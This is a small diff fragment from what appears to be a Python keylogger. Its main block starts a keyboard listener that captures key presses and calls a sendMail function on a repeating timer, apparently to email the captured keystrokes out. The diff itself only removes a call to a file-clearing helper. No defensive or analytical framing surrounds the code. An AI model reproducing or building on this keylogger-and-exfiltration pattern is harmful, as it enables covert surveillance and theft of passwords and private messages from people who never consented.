@@ -83,7 +83,6 @@ def sendMail():
         threading.Timer(sendDelay, sendMail).start()
 
 if __name__ == "__main__":
-    holtClear(filePath)
     sendMail()
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
